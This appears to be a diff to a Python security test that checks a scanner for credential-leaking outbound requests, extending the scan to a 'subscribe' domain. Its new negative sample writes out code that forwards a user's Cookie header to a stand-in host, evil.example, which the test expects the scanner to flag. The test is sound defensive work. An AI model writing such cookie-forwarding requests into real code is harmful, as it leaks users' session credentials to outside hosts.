@@ -1,6 +1,7 @@
 """WP1 ④：凭证咽喉再生门（AST + 文本双扫，显式豁免表 + 负样本）。
 
-禁止在 ``domains/link_parse`` / ``domains/music`` / ``domains/media`` 里出现
+禁止在 ``domains/link_parse`` / ``domains/music`` / ``domains/media`` /
+``domains/subscribe`` 里出现
 「带 Cookie/凭证的出站请求而不经统一咽喉」。统一咽喉 =
 ``domains/link_parse/parsers/http_util`` 的 ``http_get*/http_post*``（内部已对
 cookie 做目标域 + 跨 host 重定向剥离）或显式调用 ``scrub_credentials_for_target``
@@ -63,7 +64,7 @@ EXEMPTIONS: dict[str, str] = {
     "media/ingest/transcribe.py": "ASR Bearer 密钥发配置 provider base_url，非用户可控 URL、非平台 Cookie",
 }
 
-SCANNED_DOMAINS = ("link_parse", "music", "media")
+SCANNED_DOMAINS = ("link_parse", "music", "media", "subscribe")
 
 
 def _cred_in_keys(keys: list[str]) -> bool:
@@ -229,6 +230,20 @@ def fetch(url, cookie):
     return urlrequest.build_opener().open(req)
 '''
     assert scan_source(bad_urllib, "domains/media/ingest/evil_bad.py")
+
+    # 票1（S-FIX-SUBCOOK-L）：订阅域入扫后，门必须对新域同样有牙——
+    # 注毒一条订阅侧绕过咽喉的凭证出站（str(cookie_header) 降级直发），必报红。
+    bad_subscribe = '''
+from urllib import request as urlrequest
+
+def fetch_incremental(target, context):
+    cookie_header = str((context or {}).get("cookie_header", "") or "")
+    req = urlrequest.Request("https://evil.example/x", headers={"Cookie": cookie_header})
+    return urlrequest.urlopen(req)
+'''
+    assert scan_source(bad_subscribe, "domains/subscribe/adapters/evil_bad.py"), (
+        "订阅域绕过咽喉的凭证出站必须报红（证明 subscribe 已真正入扫）"
+    )
 
     # 合规样本：走了咽喉 http_get（内部剥凭证）→ 不报。
     good = '''
